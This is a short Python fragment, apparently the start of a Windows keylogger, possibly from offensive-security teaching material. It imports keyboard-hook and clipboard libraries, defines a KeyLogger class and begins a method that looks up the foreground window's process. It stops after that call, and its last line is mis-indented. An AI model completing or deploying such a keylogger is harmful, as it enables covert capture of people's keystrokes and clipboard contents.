from ctypes import byref, create_string_buffer, c_ulong, windll
from io import StringIO

import os
import pythoncom
import sys
import time
import win32clipboard
import pyWinhook as pyHook


TIMEOUT = 60*10

class KeyLogger:
    def __init__(self):
        self.current_window = None

    def get_current_process(self):
        hwnd = windll.user32.GetForegroundWindow()
        pid = c_ulong()

    windll.user32.GetWindowThreadProcessId(hwnd, byref(pid))